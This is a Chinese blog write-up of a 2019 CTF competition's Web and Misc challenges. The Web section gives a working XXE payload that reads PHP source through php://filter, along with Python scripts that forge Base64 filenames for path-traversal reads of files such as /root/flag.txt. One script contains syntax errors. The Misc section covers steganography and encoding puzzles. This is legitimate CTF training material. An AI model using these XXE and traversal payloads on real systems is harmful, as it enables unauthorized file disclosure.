---
title: 中关村网络与信息安全领域专项赛 Web&Misc
key: b324712846539bd8cf719ae38414c8e4
date: 2019-08-22 14:47:25
tags:
  - Writeup
  - CTF
---

## Web

### Game

![](/assets/images/move/2019-08-22-14-53-05.png)

查看网页源代码，在`/js/cqg.js`发现关键操作如下：

```js
if(score == 15){
    $.ajax({
        url: 'score.php',
        type: 'POST',
        data: 'score='+score,
        success: function(data){
            var data = data;
            $("#output").text(data);
        }
    })         
}
```

向`score.php`POST发送数据`score=15`即可获取flag.

```bash
$curl http://xxx.ichunqiu.com/score.php -X POST -d "score=15"
flag{30941f66-2145-417f-b9a9-7ea0e252085e}
```



### who_are_you?

![](/assets/images/move/2019-08-22-14-53-21.png)

F12查看网页源代码，发现以下关键操作：

```js
function func() {
    // document.getElementById().value
    var xml = '' +
        '<\?xml version="1.0" encoding="UTF-8"\?>' +
        '<feedback>' +
        '<author>' + document.getElementById('name').value+ '</author>' +
        '</feedback>';
    console.log(xml);
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == 4) {
            // console.log(xmlhttp.readyState);
            // console.log(xmlhttp.responseText);
            var res = xmlhttp.responseText;
            document.getElementById('title').textContent = res
        }
    };
    xmlhttp.open("POST", "index.php", true);
    xmlhttp.send(xml);
    return false;
};
```

`XXE` + `PHP伪协议`读取`index.php`，构造exp.xml如下:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE a [ <!ENTITY b SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"> ]>
<feedback><author>&b;</author></feedback>
```

`curl`POST xml 到 index.php:

```bash
C:\Users\MS\Desktop
$ cat 1.xml | curl -X POST -H 'Content-type:text/xml' -d @- http://511f85c9e1c7477c8f462704f4e599ee913cff411be04624.changame.ichunqiu.com/index.php
PD9waHAKbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlcihmYWxzZSk7CiRkYXRhID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCdwaHA6Ly9pbnB1dCcpOwokcmVzcCA9ICcnOwovLyRmbGFnPSdmbGFnezI2ZDhkMGMzLTk5NDEtNDExMS1iNGMwLTE4MzBkZTYwMzgxOH0nOwppZigkZGF0YSAhPSBmYWxzZSl7CiAgICAkZG9tID0gbmV3IERPTURvY3VtZW50KCk7CiAgICAkZG9tLT5sb2FkWE1MKCRkYXRhLCBMSUJYTUxfTk9FTlQpOwogICAgb2Jfc3RhcnQoKTsKICAgICRyZXMgID0gJGRvbS0+dGV4dENvbnRlbnQ7CiAgICAkcmVzcCA9IG9iX2dldF9jb250ZW50cygpOwogICAgb2JfZW5kX2NsZWFuKCk7CiAgICBpZiAoJHJlcyl7CiAgICAgICAgZGllKCRyZXMpOwogICAgfQoKfQo/Pgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPgo8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgIDx0aXRsZT53ZWxjb21lPC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iLi9zdHlsZS5jc3MiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJpZT1lZGdlIj4KCjwvaGVhZD4KPGJvZHkgY2xhc3M9ImNvbnRhY3RCb2R5Ij4KPGRpdiBjbGFzcz0id3JhcHBlciI+CiAgICA8ZGl2IGNsYXNzPSJ0aXRsZSI+CgoKICAgIDwvZGl2PgoKCiAgICA8Zm9ybSBtZXRob2Q9InBvc3QiIGNsYXNzPSJmb3JtIj4KICAgICAgICA8aDEgaWQ9InRpdGxlIj7or7fovpPlhaXlp5PlkI08L2gxPgogICAgICAgIDxici8+CiAgICAgICAgPGJyLz4KICAgICAgICA8YnIvPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0ibmFtZSBlbnRyeSAiIGlkPSJuYW1lIiBuYW1lPSJuYW1lIiBwbGFjZWhvbGRlcj0iWW91ciBOYW1lIi8+CiAgICA8L2Zvcm0+CiAgICA8YnV0dG9uIGNsYXNzPSJzdWJtaXQgZW50cnkiIG9uY2xpY2s9ImZ1bmMoKSI+U3VibWl0PC9idXR0b24+CgogICAgPGRpdiBjbGFzcz0ic2hhZG93Ij48L2Rpdj4KPC9kaXY+Cgo8L2JvZHk+CjwvaHRtbD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgogICAgZnVuY3Rpb24gcGxheSgpIHsKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgICBmdW5jdGlvbiBmdW5jKCkgewogICAgICAgIC8vIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCkudmFsdWUKICAgICAgICB2YXIgeG1sID0gJycgKwogICAgICAgICAgICAnPFw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ilw/PicgKwogICAgICAgICAgICAnPGZlZWRiYWNrPicgKwogICAgICAgICAgICAnPGF1dGhvcj4nICsgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ25hbWUnKS52YWx1ZSsgJzwvYXV0aG9yPicgKwogICAgICAgICAgICAnPC9mZWVkYmFjaz4nOwogICAgICAgIGNvbnNvbGUubG9nKHhtbCk7CiAgICAgICAgdmFyIHhtbGh0dHAgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKICAgICAgICB4bWxodHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgaWYgKHhtbGh0dHAucmVhZHlTdGF0ZSA9PSA0KSB7CiAgICAgICAgICAgICAgICAvLyBjb25zb2xlLmxvZyh4bWxodHRwLnJlYWR5U3RhdGUpOwogICAgICAgICAgICAgICAgLy8gY29uc29sZS5sb2coeG1saHR0cC5yZXNwb25zZVRleHQpOwogICAgICAgICAgICAgICAgdmFyIHJlcyA9IHhtbGh0dHAucmVzcG9uc2VUZXh0OwogICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RpdGxlJykudGV4dENvbnRlbnQgPSByZXMKICAgICAgICAgICAgfQogICAgICAgIH07CiAgICAgICAgeG1saHR0cC5vcGVuKCJQT1NUIiwgImluZGV4LnBocCIsIHRydWUpOwogICAgICAgIHhtbGh0dHAuc2VuZCh4bWwpOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH07Cjwvc2NyaXB0Pgo8L2JvZHk+CjwvaHRtbD4=
```

Base64解码得到PHP代码:

```php
<?php
libxml_disable_entity_loader(false);
$data = @file_get_contents('php://input');
$resp = '';
//$flag='flag{26d8d0c3-9941-4111-b4c0-1830de603818}';
if($data != false){
    $dom = new DOMDocument();
    $dom->loadXML($data, LIBXML_NOENT);
    ob_start();
    $res  = $dom->textContent;
    $resp = ob_get_contents();
    ob_end_clean();
    if ($res){
        die($res);
    }

}
?>
```

获取到flag{26d8d0c3-9941-4111-b4c0-1830de603818}.


### show_me_your_image

> hint: base64 hint2:templates/upload.html

![](/assets/images/move/2019-08-22-14-53-46.png)

fuzz文件名类似Base64编码，猜测为更改码表的Base64编码。

> Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于2^6=64，所以每6个位元为一个单元，对应某个可打印字符。3个字节有24个位元，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。它可用来作为电子邮件的传输编码。在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有62个字符，此外两个可打印符号在不同的系统中而不同（标准为+和/）。一些如uuencode的其他编码方法使用不同的64字符集来代表6个二进制数字，但是不被称为Base64。

![](/assets/images/move/2019-08-22-14-54-14.png)

这样可以通过爆破码表/截取payload片段即可达成任意文件读取，`/proc/self/cwd/`指向的是当前路径，在本题中可用于填充拼凑3倍数长度的字符串。

- 爆破码表
```python
import re
import base64
import string
import random
import requests
from urllib.parse import unquote, quote

r = requests.session()
url = ''
new_dict = {}

def get_b_name():
    test_name = ''.join(random.sample(string.ascii_letters + string.digits, 50))
    o_file_name = test_name + '.jpg'
    origin = base64.b64encode(str.encode(o_file_name))
    origin = bytes.decode(origin)
    upload_url = url + '/upload.php'
    with open('test.jpg', 'rb') as file:
        files == {'file':(o_file_name, file)}
        response = requests.post(upload_url, file=files)
        text = response.text
        file_name = re.search(r'"img.php\?name=(.+?)"', text).group(1)
        file_name = unquote(file_name)
    return origin, file_name
    
def make_dict(origin, file_name):
    num = 0
    for i in origin:
        new_dict[i] = file_name[num]
        num += 1

if __name__ == '__main__':
    length = len(new_dict)
    for i in range(15):
        origin, file_name = get_b_name()
        make_dict(origin, filename)
        length = len(new_dict)
    res = []
    flag = bytes.decode(base64.b64encode(b'../../../../root/flag.txt'))
    for f in flag:
        if f == '=':
            res.append('=')
        else
            res.append(new_dict[f])
    payload = ''.join(res)
    print(quote(payload))
```


- 截取`xx.jpg`之前的内容作为payload

```python
import sys
import requests
from bs4 import BeautifulSoup

try:
    import urllib.parse as parse
except:
    import urllib as parse

url = 'http://040e0b15532e43929b8c5f5160cb0e51420d26a57ed548a7.changame.ichunqiu.com/'

def base_encode(filename):
    r = requests.post(url+'upload.php', files={ \
        'file':(filename+'12.jpg', b'xxx', 'image/jpeg') \
        }, allow_redirects=0)
    soup = BeautifulSoup(r.text, 'html.parser')
    pic_url = soup.find('img')
    encrypt = pic_url['src'].replace('img.php?name=', '')
    encrypt = parse.unquote(encrypt)
    return encrypt[:-8]

def read(filename):
    filename = parse.quote(filename)
    r = requests.get(url+"img.php",
                    params={'name': filename})
    print(r.text)


if __name__ == "__main__":
    filename = sys.argv[1]
    if len(filename) % 3 != 0:
        exit('Payload % 3 != 0') 
    # payload = "../.././proc/self/root/root/flag.txt"
    # payload = "../..//proc/self/cwd/app.py"
    read(base_encode(filename))
```

网站源代码:

```python
import os
from urllib import parse
from base64 import b64decode, b64encode
from utils import r_encode, r_decode, read_file
from flask import render_template, Response
from flask import Flask, session, redirect, request
from werkzeug.utils import secure_filename

app = Flask(__name__)

app.config['SECRET_KEY'] = os.urandom(24)

UPLOAD_FOLDER = '/tmp/uploads/'

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER


def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1] in ALLOWED_EXTENSIONS


@app.route('/')
@app.route('/index.php')
def home():
    file = session.get('file')
    if file:
        file = bytes.decode(file)
        file = parse.quote(file)
    return render_template('index.html', file=file)


@app.route('/upload.php', methods=['POST'])
def upload():
    if request.method == 'POST':
        file = request.files['file']
        if file and allowed_file(file.filename):
            if not os.path.exists(app.config['UPLOAD_FOLDER']):
                os.makedirs(app.config['UPLOAD_FOLDER'])
            filename = secure_filename(file.filename)
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
        else:
            return "不允许的格式"
    session['file'] = r_encode(b64encode(str.encode(file.filename)))
    return redirect('/')


@app.route('/img.php', methods=['GET'])
def img():
    file = request.args.get("name")
    file = r_decode(str.encode(file))
    file = b64decode(file)
    file = UPLOAD_FOLDER + bytes.decode(file)
    image = read_file(file)
    return Response(image, mimetype="image/jpeg")


if __name__ == '__main__':
    app.run(
        host = '0.0.0.0',
        port = 80,
     )
```



## Misc

### 签到题

I'm gamectf.com, I love TXT.

```bash
user@ubuntu:~/桌面$ dig gamectf.com TXT

; <<>> DiG 9.11.5-P1-1ubuntu2.5-Ubuntu <<>> gamectf.com TXT
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 37350
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;gamectf.com.			IN	TXT

;; ANSWER SECTION:
gamectf.com.		5	IN	TXT	"flag{welcome_TXT}"

;; Query time: 110 msec
;; SERVER: 127.0.0.53#53(127.0.0.53)
;; WHEN: 三 8月 14 19:25:44 PDT 2019
;; MSG SIZE  rcvd: 70

```



### 24word



![](/assets/images/move/2019-08-22-14-54-40.png)



`zsteg`探测到图片中包含`zip`信息，将核心价值观解码得到zip解压密码。

```bash
C:\Users\MS\Desktop\Misc\24word
$ zsteg 24w.png
[?] 255706 bytes of extra data after image end (IEND), offset = 0x5936
extradata:0         .. file: Zip archive data, at least v2.0 to extract
    00000000: 50 4b 03 04 14 00 09 00  08 00 c4 9b 0c 4f 4d 0b  |PK...........OM.|
    00000010: 0a f5 36 e6 03 00 4b 45  04 00 07 00 00 00 32 34  |..6...KE......24|
    00000020: 63 2e 6a 70 67 09 ad d0  e4 51 c0 f8 89 d9 74 6b  |c.jpg....Q....tk|
    00000030: 00 e2 3b 45 54 20 ca 6e  fa 02 85 f7 56 d7 5c 10  |..;ET .n....V.\.|
    00000040: 4a 89 be 2e 05 f8 ea 82  a3 f3 b8 d9 88 e3 57 8b  |J.............W.|
    00000050: 75 7f 56 d4 3a 54 fc b6  b3 cc a2 3e 39 00 7b 34  |u.V.:T.....>9.{4|
    00000060: 29 50 c2 e6 96 c6 15 e5  b8 3b 97 f4 5d 6a dc 48  |)P.......;..]j.H|
    00000070: 58 9e e3 78 e6 1c 83 4b  45 34 26 c7 9f 66 88 9b  |X..x...KE4&..f..|
    00000080: a2 f0 b5 f9 b9 b4 b9 da  f4 f7 99 ea bd bd 84 9f  |................|
    00000090: 5d e2 70 cf c5 4f f5 1a  ff f4 a4 73 7d 44 48 c9  |].p..O.....s}DH.|
    000000a0: 31 fb 05 1f 15 95 f7 8b  76 58 31 8e 0a 43 98 d1  |1.......vX1..C..|
    000000b0: cd bc 94 4b 90 1a 91 10  0c 85 95 3f 38 7a 7b 1d  |...K.......?8z{.|
    000000c0: 26 20 eb 8e cd 46 2a 8d  72 6c 20 8b bb 3a 2f 75  |& ...F*.rl ..:/u|
    000000d0: 52 9b fd d2 2e 65 24 b9  5b a5 28 fa 87 18 8e 54  |R....e$.[.(....T|
    000000e0: a0 a5 02 35 92 97 7b f1  25 94 13 00 24 49 b0 bb  |...5..{.%...$I..|
    000000f0: 9b 90 07 91 72 58 46 d6  3f e7 68 82 a4 b8 89 14  |....rXF.?.h.....|
imagedata           .. text: "IIIBBB777"
```

```bash
自由和谐公正诚信平等公正自由公正平等平等公正
公正民主公正诚信文明法治平等公正平等法治和谐

CodeValues
```

获取新图片如下：

![](/assets/images/move/2019-08-22-14-54-58.png)

扫描QR得到flag。

```bash
flag{24_word_m4n7ra}
```



### 七代目

下载zip压缩包后解压获取`七代目.gif`,显示文件无法打开，Hex编辑文件头修改PNG->GIF后方可打开。

```bash
PNG (png)，文件头：89504E47 
GIF (gif)，文件头：47494638 
```

对66帧的gif动画进行脱帧处理，在第七帧中获取flag.

![](/assets/images/move/2019-08-22-14-55-06.png)



```bash
flag{49bdbe-abfe-472-9f66-a533331e6}
```



### 亚萨西

压缩包损坏，使用7-Zip可直接提取文件，解压zip文件(从pass:loli猜测得到解压密码`loli`)，得到`timg.jpg`.

![](/assets/images/move/2019-08-22-14-55-29.png)

![](/assets/images/move/2019-08-22-14-55-37.png)

Winhex打开观察到文件末尾存在大量`.!?`组成的段落，系`Ook`编码。

![](/assets/images/move/2019-08-22-14-55-47.png)

https://www.splitbrain.org/services/ook 在线解码即可。

![](/assets/images/move/2019-08-22-14-55-57.png)


```bash
flag{f71d6bca-3210-4a31-9feb-1768a65a33db}
```


